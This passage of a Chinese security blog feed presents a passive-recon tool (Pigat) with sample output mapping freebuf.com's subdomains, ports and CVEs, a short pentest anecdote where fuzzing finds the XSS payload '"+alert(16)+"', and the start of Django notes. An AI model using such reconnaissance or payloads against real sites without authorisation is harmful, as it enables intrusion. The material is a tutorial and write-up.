title="使用方法"></a>使用方法</h2><h3 id="1、安装MongoDB"><a href="#1、安装MongoDB" class="headerlink" title="1、安装MongoDB"></a>1、安装MongoDB</h3><p>这一步可自行百度，如果不是在本地主机安装，则需要在安装MongoDB之后修改<code>setting.py</code>文件的第72行，将数据库的URL及端口改为自己设置的即可，默认配置如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">MONGO_DB_URI <span class="token operator">=</span> <span class="token string">'mongodb://localhost:27017'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2、安装第三方模块文件"><a href="#2、安装第三方模块文件" class="headerlink" title="2、安装第三方模块文件"></a>2、安装第三方模块文件</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip3 <span class="token function">install</span> -r requirements.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3、开始运行"><a href="#3、开始运行" class="headerlink" title="3、开始运行"></a>3、开始运行</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 start.py -u target.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="帮助"><a href="#帮助" class="headerlink" title="帮助"></a>帮助</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-u ：指定要被动收集的url-o <span class="token builtin class-name">:</span> 导出被动收集结果，支持 CSV、JSON、XML 等格式，结果将保存到 ./output 目录下-a <span class="token builtin class-name">:</span> 直接被动收集所有结果，没有步骤提示信息，并默认导出 result.csv 文件-h <span class="token builtin class-name">:</span> 查看帮助<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="python3-start-py-u-teamssix-com"><a href="#python3-start-py-u-teamssix-com" class="headerlink" title="python3 start.py -u teamssix.com"></a>python3 start.py -u teamssix.com</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">- - - - - - - - - - - - - - - - - - - - - - - - - - - 操作编号： <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> 被动收集备案信息 <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> 被动收集 Whois 信息 <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> 被动收集子域名信息 <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> 被动收集子域名 IP 信息 <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> 被动收集子域名 CMS 信息 <span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> 被动收集子域名 Shodan 信息 <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> 被动收集子域名漏洞信息 <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> 退出程序 备注：第 <span class="token number">3</span> 步执行一次后才可执行 <span class="token number">4</span>、5、6 步，第 <span class="token number">6</span> 步执行一次后才可执行第 <span class="token number">7</span> 步，否则运行会出现错误提示。- - - - - - - - - - - - - - - - - - - - - - - - - - -<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:36:35<span class="token punctuation">]</span> 请输入你的操作步骤 <span class="token builtin class-name">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="python3-start-py-u-teamssix-com-a"><a href="#python3-start-py-u-teamssix-com-a" class="headerlink" title="python3 start.py -u teamssix.com -a"></a>python3 start.py -u teamssix.com -a</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:45:50<span class="token punctuation">]</span> 正在被动收集 freebuf.com 的备案信息……<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:45:50<span class="token punctuation">]</span> 备案网站名称：黑客与极客<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:45:50<span class="token punctuation">]</span> 备案单位类型：企业<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:45:50<span class="token punctuation">]</span> 备案单位名称：上海斗象信息科技有限公司<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:45:50<span class="token punctuation">]</span> 备案网站首页：www.freebuf.com<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:45:50<span class="token punctuation">]</span> 备案许可证号：沪ICP备13033796号-1<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:45:50<span class="token punctuation">]</span> 备案审核时间：2019/7/17<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:45:56<span class="token punctuation">]</span> 正在被动收集 freebuf.com 的 Whois 信息……<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:45:56<span class="token punctuation">]</span> 注册商：Alibaba Cloud Computing <span class="token punctuation">(</span>Beijing<span class="token punctuation">)</span> Co., Ltd.<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:45:56<span class="token punctuation">]</span> 注册邮箱：DomainAbuse@service.aliyun.com<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:45:56<span class="token punctuation">]</span> 注册电话：+86.95187<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:45:56<span class="token punctuation">]</span> 注册网址：http://www.net.cn<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:45:56<span class="token punctuation">]</span> 注册商 Whois 服务器：grs-whois.hichina.com<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:45:56<span class="token punctuation">]</span> DNS 解析服务器：<span class="token punctuation">[</span><span class="token string">'F1G1NS1.DNSPOD.NET'</span>, <span class="token string">'F1G1NS2.DNSPOD.NET'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:45:56<span class="token punctuation">]</span> 注册日期：2010-08-21T15:24:37Z<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:45:56<span class="token punctuation">]</span> 到期日期：2021-08-21T15:24:37Z<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:45:56<span class="token punctuation">]</span> 更新日期：2020-02-27T02:03:14Z<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:46:04<span class="token punctuation">]</span> 正在被动收集 freebuf.com 的子域信息……<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:46:04<span class="token punctuation">]</span> 搜索<span class="token string">"freebuf.com"</span>查询结果为:29条。响应时间：5.204秒，搜索结果共 <span class="token number">2</span> 页<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:46:04<span class="token punctuation">]</span> zhuanlan.freebuf.com      专栏 - FreeBuf 互联网安全新媒体平台 <span class="token operator">|</span> 关注黑客与极客    <span class="token number">200</span><span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:46:04<span class="token punctuation">]</span> you3enter.freebuf.com     空<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:46:04<span class="token punctuation">]</span> www.freebuf.com   FreeBuf互联网安全新媒体平台     <span class="token number">200</span>……此处内容太多，省略……<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:46:06<span class="token punctuation">]</span> ai.freebuf.com    空<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:46:06<span class="token punctuation">]</span> freebuf.com       FreeBuf互联网安全新媒体平台     <span class="token number">200</span><span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:46:09<span class="token punctuation">]</span> 正在被动收集 freebuf.com 的子域 IP 信息……<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:46:09<span class="token punctuation">]</span> 提示：如果出现大量无法判断 IP 的情况，请尝试更换自己的IP<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:46:09<span class="token punctuation">]</span> freebuf.com       wittest.freebuf.com             <span class="token number">123.57</span>.248.123<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:46:09<span class="token punctuation">]</span> freebuf.com       www.freebuf.com         <span class="token number">123.57</span>.145.69……此处内容太多，省略……<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:46:12<span class="token punctuation">]</span> freebuf.com       ai.freebuf.com          无法判断 IP<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:46:14<span class="token punctuation">]</span> freebuf.com       static.freebuf.com              <span class="token number">39.96</span>.250.248<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:46:17<span class="token punctuation">]</span> 正在被动收集 freebuf.com 的子域 CMS 信息……<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:46:18<span class="token punctuation">]</span> freebuf.com       static.freebuf.com                      Apache <span class="token number">2.2</span>.21<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:46:19<span class="token punctuation">]</span> freebuf.com       wittest.freebuf.com     WitAwards <span class="token number">2017</span>互联网安全年度评选                源……此处内容太多，省略……<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:46:28<span class="token punctuation">]</span> freebuf.com       bar.freebuf.com FreeBuf小酒馆           Apache <span class="token number">2.2</span>.21<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:46:29<span class="token punctuation">]</span> freebuf.com       company.freebuf.com     FreeBuf.COM <span class="token operator">|</span> 企业空间          jQuery <span class="token number">2.0</span>.3    Twitter Bootstrap       Tengine PHP<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:47:23<span class="token punctuation">]</span> 正在被动收集 freebuf.com 的子域 shodan 信息……<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:47:23<span class="token punctuation">]</span> 如果您的 api 输入错误，可到数据库中修改<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:47:26<span class="token punctuation">]</span> freebuf.com       <span class="token number">123.57</span>.145.69   <span class="token punctuation">[</span><span class="token string">'www.freebuf.com'</span>, <span class="token string">'search.freebuf.com'</span><span class="token punctuation">]</span>       China   Aliyun Computing Co.    None    <span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:47:26<span class="token punctuation">]</span> freebuf.com       <span class="token number">182.254</span>.150.199 <span class="token punctuation">[</span><span class="token string">'freebuf.com'</span>, <span class="token string">'freebuf.com'</span><span class="token punctuation">]</span>  China   Tencent cloud computing None    <span class="token punctuation">[</span><span class="token number">443</span><span class="token punctuation">]</span>   <span class="token punctuation">[</span><span class="token string">'CVE-2016-6291'</span>, <span class="token string">'CVE-2016-6290'</span>, <span class="token string">'CVE-2016-6292'</span>, <span class="token string">'CVE-2016-4473'</span>, <span class="token string">'CVE-2016-6294'</span>, <span class="token string">'CVE-2016-6297'</span>, <span class="token string">'CVE-2016-5767'</span>, <span class="token string">'CVE-2016-5768'</span>, <span class="token string">'CVE-2016-5769'</span>, <span class="token string">'CVE-2018-10547'</span>, <span class="token string">'CVE-2018-10546'</span>, <span class="token string">'CVE-2019-9641'</span>, <span class="token string">'CVE-2016-6295'</span>, <span class="token string">'CVE-2018-10548'</span>, <span class="token string">'CVE-2018-19520'</span>, <span class="token string">'CVE-2018-19396'</span>, <span class="token string">'CVE-2016-7478'</span>, <span class="token string">'CVE-2016-5766'</span>, <span class="token string">'CVE-2018-19935'</span>, <span class="token string">'CVE-2016-6296'</span>, <span class="token string">'CVE-2018-17082'</span>, <span class="token string">'CVE-2018-10545'</span>, <span class="token string">'CVE-2019-9639'</span>, <span class="token string">'CVE-2019-9638'</span>, <span class="token string">'CVE-2019-9637'</span>, <span class="token string">'CVE-2015-8994'</span>, <span class="token string">'CVE-2018-14883'</span>, <span class="token string">'CVE-2016-5773'</span>, <span class="token string">'CVE-2016-5772'</span>, <span class="token string">'CVE-2016-5771'</span>, <span class="token string">'CVE-2016-5770'</span>, <span class="token string">'CVE-2016-6289'</span>, <span class="token string">'CVE-2018-19395'</span>, <span class="token string">'CVE-2019-6977'</span>, <span class="token string">'CVE-2018-20783'</span>, <span class="token string">'CVE-2016-7568'</span>, <span class="token string">'CVE-2018-19518'</span>, <span class="token string">'CVE-2016-5399'</span>, <span class="token string">'CVE-2019-9023'</span>, <span class="token string">'CVE-2019-9020'</span>, <span class="token string">'CVE-2019-9021'</span>, <span class="token string">'CVE-2017-16642'</span>, <span class="token string">'CVE-2019-9024'</span>, <span class="token string">'CVE-2018-15132'</span>, <span class="token string">'CVE-2018-10549'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:47:46<span class="token punctuation">]</span> freebuf.com       <span class="token number">123.57</span>.248.123  <span class="token punctuation">[</span><span class="token string">'wittest.freebuf.com'</span>, <span class="token string">'wittest.freebuf.com'</span><span class="token punctuation">]</span>  China   Aliyun Computing Co.    None    <span class="token punctuation">[</span><span class="token number">80</span>, <span class="token number">443</span>, <span class="token number">2222</span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token string">'CVE-2012-0021'</span>, <span class="token string">'CVE-2017-15906'</span>, <span class="token string">'CVE-2011-4317'</span>, <span class="token string">'CVE-2017-7679'</span>, <span class="token string">'CVE-2016-0777'</span>, <span class="token string">'CVE-2018-1312'</span>, <span class="token string">'CVE-2011-3368'</span>, <span class="token string">'CVE-2012-3499'</span>, <span class="token string">'CVE-2012-4558'</span>, <span class="token string">'CVE-2013-1896'</span>, <span class="token string">'CVE-2011-5000'</span>, <span class="token string">'CVE-2016-8612'</span>, <span class="token string">'CVE-2014-1692'</span>, <span class="token string">'CVE-2012-4557'</span>, <span class="token string">'CVE-2014-0098'</span>, <span class="token string">'CVE-2017-7668'</span>, <span class="token string">'CVE-2012-0814'</span>, <span class="token string">'CVE-2013-6438'</span>, <span class="token string">'CVE-2012-2687'</span>, <span class="token string">'CVE-2011-4415'</span>, <span class="token string">'CVE-2012-0031'</span>, <span class="token string">'CVE-2010-5107'</span>, <span class="token string">'CVE-2013-2249'</span>, <span class="token string">'CVE-2016-10708'</span>, <span class="token string">'CVE-2011-3607'</span>, <span class="token string">'CVE-2017-3167'</span>, <span class="token string">'CVE-2011-4327'</span>, <span class="token string">'CVE-2012-0053'</span>, <span class="token string">'CVE-2012-0883'</span>, <span class="token string">'CVE-2017-3169'</span>, <span class="token string">'CVE-2014-0231'</span>, <span class="token string">'CVE-2013-1862'</span>, <span class="token string">'CVE-2016-4975'</span>, <span class="token string">'CVE-2010-4478'</span>, <span class="token string">'CVE-2010-4755'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:47:54<span class="token punctuation">]</span> freebuf.com       <span class="token number">39.96</span>.250.248   <span class="token punctuation">[</span><span class="token string">'zhuanlan.freebuf.com'</span>, <span class="token string">'shop.freebuf.com'</span>, <span class="token string">'wit.freebuf.com'</span>, <span class="token string">'my.freebuf.com'</span>, <span class="token string">'open.freebuf.com'</span>, <span class="token string">'static.freebuf.com'</span>, <span class="token string">'live.freebuf.com'</span>, <span class="token string">'job.freebuf.com'</span>, <span class="token string">'prize.freebuf.com'</span>, <span class="token string">'www.freebuf.com'</span>, <span class="token string">'fit.freebuf.com'</span>, <span class="token string">'api.freebuf.com'</span>, <span class="token string">'chat.freebuf.com'</span>, <span class="token string">'bar.freebuf.com'</span>, <span class="token string">'company.freebuf.com'</span>, <span class="token string">'wit.freebuf.com'</span>, <span class="token string">'prize.freebuf.com'</span>, <span class="token string">'zhuanlan.freebuf.com'</span>, <span class="token string">'open.freebuf.com'</span>, <span class="token string">'live.freebuf.com'</span>, <span class="token string">'job.freebuf.com'</span>, <span class="token string">'fit.freebuf.com'</span>, <span class="token string">'my.freebuf.com'</span>, <span class="token string">'shop.freebuf.com'</span>, <span class="token string">'api.freebuf.com'</span>, <span class="token string">'chat.freebuf.com'</span>, <span class="token string">'company.freebuf.com'</span>, <span class="token string">'bar.freebuf.com'</span>, <span class="token string">'static.freebuf.com'</span><span class="token punctuation">]</span>   China   Aliyun Computing Co.    None    <span class="token punctuation">[</span><span class="token number">5000</span>, <span class="token number">6666</span>, <span class="token number">8334</span>, <span class="token number">8080</span>, <span class="token number">8081</span>, <span class="token number">7443</span>, <span class="token number">8086</span>, <span class="token number">8087</span>, <span class="token number">8090</span>, <span class="token number">10000</span>, <span class="token number">9201</span>, <span class="token number">9000</span>, <span class="token number">8106</span>, <span class="token number">9003</span>, <span class="token number">53</span>, <span class="token number">443</span>, <span class="token number">8000</span>, <span class="token number">8001</span>, <span class="token number">8002</span>, <span class="token number">8009</span>, <span class="token number">81</span>, <span class="token number">82</span>, <span class="token number">83</span>, <span class="token number">7001</span>, <span class="token number">4443</span>, <span class="token number">8800</span>, <span class="token number">7777</span>, <span class="token number">1000</span>, <span class="token number">9200</span>, <span class="token number">6001</span>, <span class="token number">8181</span>, <span class="token number">8443</span>, <span class="token number">9002</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:47:57<span class="token punctuation">]</span> 正在被动收集 freebuf.com 的漏洞详情信息……<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:47:58<span class="token punctuation">]</span> freebuf.com       CVE-2016-6291   高危    PHPext/exif/exif.c文件安全漏洞  <span class="token number">182.254</span>.150.199 <span class="token punctuation">[</span><span class="token string">'freebuf.com'</span><span class="token punctuation">]</span> http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD<span class="token operator">=</span>CNNVD-201607-929<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:47:58<span class="token punctuation">]</span> freebuf.com       CVE-2016-6292   中危    PHPext/exif/exif.c文件安全漏洞  <span class="token number">182.254</span>.150.199 <span class="token punctuation">[</span><span class="token string">'freebuf.com'</span><span class="token punctuation">]</span> http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD<span class="token operator">=</span>CNNVD-201607-930<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:47:58<span class="token punctuation">]</span> freebuf.com       CVE-2016-4473   高危    PHP安全漏洞     <span class="token number">182.254</span>.150.199 <span class="token punctuation">[</span><span class="token string">'freebuf.com'</span><span class="token punctuation">]</span> http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD<span class="token operator">=</span>CNNVD-201610-062<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:47:58<span class="token punctuation">]</span> freebuf.com       CVE-2016-5768   高危    PHPmbstring扩展整数溢出漏洞     <span class="token number">182.254</span>.150.199 <span class="token punctuation">[</span><span class="token string">'freebuf.com'</span><span class="token punctuation">]</span> http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD<span class="token operator">=</span>CNNVD-201606-559<span class="token punctuation">[</span><span class="token number">2020</span>-03-21 <span class="token number">13</span>:47:58<span class="token punctuation">]</span> freebuf.com       CVE-2016-6297   中危    PHPext/zip/zip_stream.c文件整数溢出漏洞 <span class="token number">182.254</span>.150.199 <span class="token punctuation">[</span><span class="token string">'freebuf.com'</span><span class="token punctuation">]</span> http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD<span class="token operator">=</span>CNNVD-201607-935……此处内容太多，省略……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="运行截图"><a href="#运行截图" class="headerlink" title="运行截图"></a>运行截图</h2><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-03-21_14-29-32.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-03-21_14-30-07.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-03-21_14-30-21.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-03-21_14-30-33.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;teamssix&#x2F;pigat&#x2F;releases<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://github.com/teamssix/pigat/releases">点击此处进入下载页面</a></p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>因为我没有太多的开发经验，因此该工具难免存在有问题以及不恰当的地方，希望各位大佬在使用的过程中碰到问题能够多多反馈。</p><p>开发不易，还望大佬们走过路过顺手给个star，小弟将不胜感激。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 工具分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具分享 </tag>
            
            <tag> 软件 </tag>
            
            <tag> Pigat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【渗透实例】Fuzz大法好啊</title>
      <link href="//200310-221008.html"/>
      <url>//200310-221008.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><blockquote><p>本文仅供学习分享用途，严禁用于违法用途</p></blockquote><p>在搞站的时候，经过一顿操作后只发现了一堆低危，过了一段时间看看Xray，居然发现一个XSS</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/1Snipaste_2020-03-10_14-10-35.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>嗯~ Xray 真香！</p><a id="more"></a><p>随后进行复现，无奈多次尝试无果，好玩的是每换一个Payload，流量经过 Xray ，Xray 还会继续报这个漏洞，并且每次Payload都不一样，这感情好，直接用 Xray 给的 Payload 吧，尝试了半天，居然没有一个成功的，当时 Xray 的界面是这样的</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/2Snipaste_2020-03-10_14-19-23.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>虽然没有一个成功复现的，但是这看着还是挺爽的，一会儿报个漏洞一会儿报个漏洞的</p><h1 id="0x01-Fuzz大法好"><a href="#0x01-Fuzz大法好" class="headerlink" title="0x01 Fuzz大法好"></a>0x01 Fuzz大法好</h1><p>屡试不行之后便想到了Fuzz，那先去GitHub上找个字典</p><blockquote><p><a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></p></blockquote><p>有了字典之后，上Burp</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/3Snipaste_2020-03-10_14-26-42.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>两千多的字典最后只有3个Payload响应200，不管了，先一个一个试试吧，那就先来试试第一个Payload</p><pre class="line-numbers language-none"><code class="language-none">&quot;+alert(16)+&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/4Snipaste_2020-03-10_14-29-54.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>哎呀呀，不得不说，妙啊！</p><p>之后我再试另外几个 Payload 就不管用了</p><p>啧啧，Xray 真香、Fuzz 真香。</p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透实例 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透实例 </tag>
            
            <tag> Fuzz </tag>
            
            <tag> Xray </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Django 学习笔记】5、常用功能</title>
      <link href="//200304-132209.html"/>
      <url>//200304-132209.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-案例实现"><a href="#0x00-案例实现" class="headerlink" title="0x00 案例实现"></a>0x00 案例实现</h1><ul><li>创建的项目名称为<code>BookManager</code>，创建应用名称为<code>Book</code>，完成<code>图书信息</code>的维护</li><li>访问图书信息列表<code>127.0.0.1:8000/booklist</code>，并且点击每个图书能够跳转到对应图书人物信息界面</li></ul><a id="more"></a><h1 id="0x01-代码实现"><a href="#0x01-代码实现" class="headerlink" title="0x01 代码实现"></a>0x01 代码实现</h1><p>1、修改<code>templates\booklist.html</code>代码</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">原来：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>&#123;&#123; book.name &#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>现在：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&#123;&#123; book.id &#125;&#125;/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>&#123;&#123; book.name &#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> #通过id值来进行对应书籍人物信息查询<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2、在<code>Book\views.py</code>中新添<code>peoplelist</code>函数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">peoplelist</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> book_id<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#book_id从url中直接传入</span>   book <span class="token operator">=</span> BookInfo<span class="token punctuation">.</span>objects<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token operator">=</span>book_id<span class="token punctuation">)</span><span class="token comment">#通过id查询书籍</span>   people_list <span class="token operator">=</span> book<span class="token 